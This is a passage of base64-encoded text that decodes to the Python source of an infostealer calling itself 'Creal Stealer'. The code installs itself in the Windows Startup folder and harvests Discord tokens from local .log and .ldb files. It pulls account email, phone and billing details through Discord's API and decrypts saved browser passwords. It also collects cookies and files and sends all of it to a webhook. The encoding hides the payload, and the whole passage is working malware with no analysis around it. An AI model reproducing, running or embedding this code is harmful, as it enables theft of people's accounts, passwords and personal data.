ODg5NTIwNzU+ICJ9LAogICAgICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICAgICAgeyJOYW1lIjogJ0h5cGVTcXVhZF9FdmVudHMnLCAnVmFsdWUnOiA0LCAnRW1vamknOiAiPDpoeXBlc3F1YWRfZXZlbnRzOjg3NDc1MDgwODU5NDQ3NzA1Nj4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdQYXJ0bmVyZWRfU2VydmVyX093bmVyJywgJ1ZhbHVlJzogMiwnRW1vamknOiAiPDpwYXJ0bmVyOjg3NDc1MDgwODY3ODM1NDk2ND4gIn0sCiAgICAgICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgICAgIF0KICAgICAgICBmb3IgYjRkZzMgaW4gYjRkZzNMaXN0OgogICAgICAgICAgICBpZiBmbGFncyAvLyBiNGRnM1siVmFsdWUiXSAhPSAwOgogICAgICAgICAgICAgICAgT3duM2RCM2RnNHMgKz0gYjRkZzNbIkVtb2ppIl0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiNGRnM1siVmFsdWUiXQoKICAgICAgICByZXR1cm4gT3duM2RCM2RnNHMKCiAgICBkZWYgRzN0VDBrNG4xbmY5KHQwazNuKToKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHQwazNuLAogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgICAgICB9CgogICAgICAgIHVzM3JqczBuID0ganNvbi5sb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgICAgICB1czNybjRtMSA9IHVzM3JqczBuWyJ1c2VybmFtZSJdCiAgICAgICAgaGFzaHRhZyA9IHVzM3JqczBuWyJkaXNjcmltaW5hdG9yIl0KICAgICAgICBlbTMxbCA9IHVzM3JqczBuWyJlbWFpbCJdCiAgICAgICAgaWRkID0gdXMzcmpzMG5bImlkIl0KICAgICAgICBwZnAgPSB1czNyanMwblsiYXZhdGFyIl0KICAgICAgICBmbGFncyA9IHVzM3JqczBuWyJwdWJsaWNfZmxhZ3MiXQogICAgICAgIG4xdHIwID0gIiIKICAgICAgICBwaDBuMyA9ICIiCgogICAgICAgIGlmICJwcmVtaXVtX3R5cGUiIGluIHVzM3JqczBuOiAKICAgICAgICAgICAgbml0cm90ID0gdXMzcmpzMG5bInByZW1pdW1fdHlwZSJdCiAgICAgICAgICAgIGlmIG5pdHJvdCA9PSAxOgogICAgICAgICAgICAgICAgbjF0cjAgPSAiPGE6REVfQmFkZ2VOaXRybzo4NjUyNDI0MzM2OTI3NjIxMjI+IgogICAgICAgICAgICBlbGlmIG5pdHJvdCA9PSAyOgogICAgICAgICAgICAgICAgbjF0cjAgPSAiPGE6REVfQmFkZ2VOaXRybzo4NjUyNDI0MzM2OTI3NjIxMjI+PGE6YXV0cl9ib29zdDE6MTAzODcyNDMyMTc3MTc4NjI0MD4iCiAgICAgICAgaWYgInBoMG4zIiBpbiB1czNyanMwbjogcGgwbjMgPSBmJ3t1czNyanMwblsicGgwbjMiXX0nCgogICAgICAgIHJldHVybiB1czNybjRtMSwgaGFzaHRhZywgZW0zMWwsIGlkZCwgcGZwLCBmbGFncywgbjF0cjAsIHBoMG4zCgogICAgZGVmIGNoMWNrVDRrMW4odDBrM24pOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJBdXRob3JpemF0aW9uIjogdDBrM24sCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1lIiwgaGVhZGVycz1oZWFkZXJzKSkKICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgIGlmIGdldGF0dHIoc3lzLCAnZnJvemVuJywgRmFsc2UpOgogICAgICAgIGN1cnJlbnRGaWxlUGF0aCA9IG9zLnBhdGguZGlybmFtZShzeXMuZXhlY3V0YWJsZSkKICAgIGVsc2U6CiAgICAgICAgY3VycmVudEZpbGVQYXRoID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpCgogICAgZmlsZU5hbWUgPSBvcy5wYXRoLmJhc2VuYW1lKHN5cy5hcmd2WzBdKQogICAgZmlsZVBhdGggPSBvcy5wYXRoLmpvaW4oY3VycmVudEZpbGVQYXRoLCBmaWxlTmFtZSkKCiAgICBzdGFydHVwRm9sZGVyUGF0aCA9IG9zLnBhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoJ34nKSwgJ0FwcERhdGEnLCAnUm9hbWluZycsICdNaWNyb3NvZnQnLCAnV2luZG93cycsICdTdGFydCBNZW51JywgJ1Byb2dyYW1zJywgJ1N0YXJ0dXAnKQogICAgc3RhcnR1cEZpbGVQYXRoID0gb3MucGF0aC5qb2luKHN0YXJ0dXBGb2xkZXJQYXRoLCBmaWxlTmFtZSkKCiAgICBpZiBvcy5wYXRoLmFic3BhdGgoZmlsZVBhdGgpLmxvd2VyKCkgIT0gb3MucGF0aC5hYnNwYXRoKHN0YXJ0dXBGaWxlUGF0aCkubG93ZXIoKToKICAgICAgICB3aXRoIG9wZW4oZmlsZVBhdGgsICdyYicpIGFzIHNyY19maWxlLCBvcGVuKHN0YXJ0dXBGaWxlUGF0aCwgJ3diJykgYXMgZHN0X2ZpbGU6CiAgICAgICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihzcmNfZmlsZSwgZHN0X2ZpbGUpCgoKICAgIGRlZiB1cGwwNWRUNGszMSh0MGszbiwgcGF0aCk6CiAgICAgICAgZ2xvYmFsIHRlbG5ldAogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIgogICAgICAgIH0KICAgICAgICB1czNybjRtMSwgaGFzaHRhZywgZW0zMWwsIGlkZCwgcGZwLCBmbGFncywgbjF0cjAsIHBoMG4zID0gRzN0VDBrNG4xbmY5KHQwazNuKQoKICAgICAgICBpZiBwZnAgPT0gTm9uZTogCiAgICAgICAgICAgIHBmcCA9ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIgogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHBmcCA9IGYiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy97aWRkfS97cGZwfSIKCiAgICAgICAgYjFsbDFuZyA9IEczdGIxbGwxbmcodDBrM24pCiAgICAgICAgYjRkZzMgPSBHM3RCNGRnMzEoZmxhZ3MpCiAgICAgICAgZnJpZW5kcyA9IEczdFVIUUZyMTNuZFModDBrM24pCiAgICAgICAgaWYgZnJpZW5kcyA9PSAnJzogZnJpZW5kcyA9ICJgYGBObyBSYXJlIEZyaWVuZHNgYGAiCiAgICAgICAgaWYgbm90IGIxbGwxbmc6CiAgICAgICAgICAgIGI0ZGczLCBwaDBuMywgYjFsbDFuZyA9ICLwn5SSIiwgIvCflJIiLCAi8J+UkiIKICAgICAgICBpZiBuMXRyMCA9PSAnJyBhbmQgYjRkZzMgPT0gJyc6IG4xdHIwID0gImBgYE5vbmVgYGAiCgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICJjb250ZW50IjogZid7Z2xvYmFsSW5mbygpfSB8IGB7cGF0aH1gJywKICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6aHlwZXJOT1BQRVJTOjgyODM2OTUxODE5OTMwODM4OD4gVG9rZW46IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7dDBrM259YGBgIiwKICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDptYWlsOjc1MDM5Mzg3MDUwNzk2NjQ4Nj4gRW1haWw6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7ZW0zMWx9YGBgIiwKICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPGE6MTY4OV9SaW5naW5nX1Bob25lOjc1NTIxOTQxNzA3NTQxNzA4OD4gUGhvbmU6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJgYGB7cGgwbjN9YGBgIiwKICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDptY19lYXJ0aDo1ODk2MzAzOTY0NzY1NTUyNjQ+IElQOiIsCiAgICAgICAgICAgICAgICAgICAgICAgICJ2YWx1ZSI6IGYiYGBge2czdDFwKCl9YGBgIiwKICAgICAgICAgICAgICAgICAgICAgICAgImlubGluZSI6IFRydWUKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiAiPDp3b296eWZhY2U6ODc0MjIwODQzNTI4NDg2OTIzPiBCYWRnZXM6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZiJ7bjF0cjB9e2I0ZGczfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOjQzOTRfY2NfY3JlZGl0Y2FyZF9jYXJ0YW9fZjRiaWh5Ojc1NTIxODI5NjgwMTk4NDU1Mz4gQmlsbGluZzoiLAogICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntiMWxsMW5nfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBUcnVlCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIjxhOm1hdmlraXJtaXppOjg1MzIzODM3MjU5MTU5OTYxNz4gSFEgRnJpZW5kczoiLAogICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmIntmcmllbmRzfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJpbmxpbmUiOiBGYWxzZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICAgICAibmFtZSI6IGYie3VzM3JuNG0xfSN7aGFzaHRhZ30gKHtpZGR9KSIsCiAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgInRodW1ibmFpbCI6IHsKICAgICAgICAgICAgICAgICAgICAidXJsIjogZiJ7cGZwfSIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciLAogICAgICAgICAgICAidXNlcm5hbWUiOiAiQ3JlYWwgU3RlYWxlciIsCiAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgIH0KICAgICAgICBMMDRkdXJsMWIodGVsbmV0LCBkYXRhPWpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKCiAgICAjaGVyc2V5IHNvbiBkZWZhIDooCiAgICBkZWYgUjRmMHJtM3QobGlzdHQpOgogICAgICAgIGUgPSByZS5maW5kYWxsKCIoXHcrW2Etel0pIixsaXN0dCkKICAgICAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICAgICAgd2hpbGUgImNvbSIgaW4gZTogZS5yZW1vdmUoImNvbSIpCiAgICAgICAgd2hpbGUgIm5ldCIgaW4gZTogZS5yZW1vdmUoIm5ldCIpCiAgICAgICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKICAgIGRlZiB1cGxvYWQobmFtZSwgbGluayk6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICAgICAgfQoKICAgICAgICBpZiBuYW1lID09ICJjcmNvb2siOgogICAgICAgICAgICByYiA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIGNvb2tpV29yZHMpCiAgICAgICAgICAgIGlmIGxlbihyYikgPiAxMDAwOiAKICAgICAgICAgICAgICAgIHJycnJyID0gUjRmMHJtM3Qoc3RyKGNvb2tpV29yZHMpKQogICAgICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKICAgICAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgICAgICJjb250ZW50IjogZiJ7Z2xvYmFsSW5mbygpfSIsCiAgICAgICAgICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgInRpdGxlIjogIkNyZWFsIHwgQ29va2llcyBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgImRlc2NyaXB0aW9uIjogZiI8OmFwb2xsb25kZWxpcm1pczoxMDEyMzcwMTgwODQ1ODgzNDkzPjogKipBY2NvdW50czoqKlxuXG57cmJ9XG5cbioqRGF0YToqKlxuPDpjb29raWVzX3RsbTo4MTY2MTkwNjM2MTg1NjgyMzQ+IOKAoiAqKntDb29raUNvdW50fSoqIENvb2tpZXMgRm91bmRcbjxhOkNIX0ljb25BcnJvd1JpZ2h0OjcxNTU4NTMyMDE3ODk0MTk5Mz4g4oCiIFtDcmVhbENvb2tpZXMudHh0XSh7bGlua30pIiwKICAgICAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImljb25fdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgInVzZXJuYW1lIjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA2ODkxNjIyMTM1NDk4MzQyNy8xMDc0MjY1MDE0NTYwNjIwNTU0L2U2ZmQzMTZmYjM1NDRmMjgxMTM2MWEzOTJhZDczZTY1LmpwZyIsCiAgICAgICAgICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBMMDRkdXJsMWIodGVsbmV0LCBkYXRhPWpzb24uZHVtcHMoZGF0YSkuZW5jb2RlKCksIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGlmIG5hbWUgPT0gImNycGFzc3ciOgogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKICAgICAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6IAogICAgICAgICAgICAgICAgcnJyID0gUjRmMHJtM3Qoc3RyKHBhc3dXb3JkcykpCiAgICAgICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikKCiAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAiY29udGVudCI6IGYie2dsb2JhbEluZm8oKX0iLAogICAgICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0aXRsZSI6ICJDcmVhbCB8IFBhc3N3b3JkIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAiZGVzY3JpcHRpb24iOiBmIjw6YXBvbGxvbmRlbGlybWlzOjEwMTIzNzAxODA4NDU4ODM0OTM+OiAqKkFjY291bnRzKio6XG57cmF9XG5cbioqRGF0YToqKlxuPGE6aGlyYV9rYXNhYW5haHRhcmk6ODg2OTQyODU2OTY5ODc1NDc2PiDigKIgKip7UDRzc3dDb3VudH0qKiBQYXNzd29yZHMgRm91bmRcbjxhOkNIX0ljb25BcnJvd1JpZ2h0OjcxNTU4NTMyMDE3ODk0MTk5Mz4g4oCiIFtDcmVhbFBhc3N3b3JkLnR4dF0oe2xpbmt9KSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJjb2xvciI6IDI4OTU2NjcsCiAgICAgICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAidGV4dCI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJpY29uX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCIsCiAgICAgICAgICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2kuaW1ndXIuY29tL1MwWnFwNFIuanBnIiwKICAgICAgICAgICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIEwwNGR1cmwxYih0ZWxuZXQsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgaWYgbmFtZSA9PSAia2l3aSI6CiAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAiY29udGVudCI6IGYie2dsb2JhbEluZm8oKX0iLAogICAgICAgICAgICAgICAgImVtYmVkcyI6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgImNvbG9yIjogMjg5NTY2NywKICAgICAgICAgICAgICAgICAgICAiZmllbGRzIjogWwogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIkludGVyZXN0aW5nIGZpbGVzIGZvdW5kIG9uIHVzZXIgUEM6IiwKICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogbGluawogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICJDcmVhbCB8IEZpbGUgU3RlYWxlciIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICJ0ZXh0IjogIkNyZWFsIFN0ZWFsZXIiLAogICAgICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiAiaHR0cHM6Ly9pLmltZ3VyLmNvbS9TMFpxcDRSLmpwZyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJ1c2VybmFtZSI6ICJDcmVhbCBTdGVhbGVyIiwKICAgICAgICAgICAgICAgICJhdmF0YXJfdXJsIjogImh0dHBzOi8vaS5pbWd1ci5jb20vUzBacXA0Ui5qcGciLAogICAgICAgICAgICAgICAgImF0dGFjaG1lbnRzIjogW10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgTDA0ZHVybDFiKHRlbG5ldCwgZGF0YT1qc29uLmR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgICAgIHJldHVybgoKCgoKICAgICMgZGVmIHVwbG9hZChuYW1lLCB0az0nJyk6CiAgICAjICAgICBoZWFkZXJzID0gewogICAgIyAgICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAjICAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICAjICAgICB9CgogICAgIyAgICAgIyByID0gcmVxdWVzdHMucG9zdChob29rLCBmaWxlcz1maWxlcykKICAgICMgICAgIExvYWRSZXF1ZXN0cygiUE9TVCIsIGhvb2ssIGZpbGVzPWZpbGVzKQogICAgICAgIAoKCgoKICAgIGRlZiB3cjF0ZWYwcmYxbDMoZGF0YSwgbmFtZSk6CiAgICAgICAgcGF0aCA9IG9zLmdldGVudigiVEVNUCIpICsgZiJcY3J7bmFtZX0udHh0IgogICAgICAgIHdpdGggb3BlbihwYXRoLCBtb2RlPSd3JywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShmIjwtLUNyZWFsIFNURUFMRVIgQkVTVCAtLT5cblxuIikKICAgICAgICAgICAgZm9yIGxpbmUgaW4gZGF0YToKICAgICAgICAgICAgICAgIGlmIGxpbmVbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKCiAgICBUMGszbnMgPSAnJwogICAgZGVmIGdldFQwazNuKHBhdGgsIGFyZyk6CiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICAgICAgcGF0aCArPSBhcmcKICAgICAgICBmb3IgZmlsZSBpbiBvcy5saXN0ZGlyKHBhdGgpOgogICAgICAgICAgICBpZiBmaWxlLmVuZHN3aXRoKCIubG9nIikgb3IgZmlsZS5lbmRzd2l0aCgiLmxkYiIpICAgOgogICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZX0iLCBlcnJvcnM9Imlnbm9yZSIpLnJlYWRsaW5lcygpIGlmIHguc3RyaXAoKV06CiAgICAgICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyIltcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI1LDExMH0iLCByIm1mYVwuW1x3LV17ODAsOTV9Iik6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0MGszbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdsb2JhbCBUMGszbnMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGNoMWNrVDRrMW4odDBrM24pOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0MGszbiBpbiBUMGszbnM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgcHJpbnQodG9rZW4pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFQwazNucyArPSB0MGszbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cGwwNWRUNGszMSh0MGszbiwgcGF0aCkKCiAgICBQNHNzdyA9IFtdCiAgICBkZWYgZ2V0UDRzc3cocGF0aCwgYXJnKToKICAgICAgICBnbG9iYWwgUDRzc3csIFA0c3N3Q291bnQKICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6IHJldHVybgoKICAgICAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiCiAgICAgICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICAgICAgdGVtcGZvbGQgPSB0ZW1wICsgImNyIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCgogICAgICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICAgICAgY29ubiA9IHNxbF9jb25uZWN0KHRlbXBmb2xkKQogICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQogICAgICAgIGRhdGEgPSBjdXJzb3IuZmV0Y2hhbGwoKQogICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgY29ubi5jbG9zZSgpCiAgICAgICAgb3MucmVtb3ZlKHRlbXBmb2xkKQoKICAgICAgICBwYXRoS2V5ID0gcGF0aCArICIvTG9jYWwgU3RhdGUiCiAgICAgICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBqc29uX2xvYWRzKGYucmVhZCgpKQogICAgICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgICAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgICAgICBmb3Igcm93IGluIGRhdGE6IAogICAgICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgICAgICBmb3Igd2EgaW4ga2V5d29yZDoKICAgICAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgICAgIHRtcCA9IHdhCiAgICAgICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9sZCBpbiBwYXN3V29yZHM6IHBhc3dXb3Jkcy5hcHBlbmQob2xkKQogICAgICAgICAgICAgICAgUDRzc3cuYXBwZW5kKGYiVVIxOiB7cm93WzBdfSB8IFU1M1JONE0zOiB7cm93WzFdfSB8IFA0NTVXMFJEOiB7RDNrcnlwdFY0bFUzKHJvd1syXS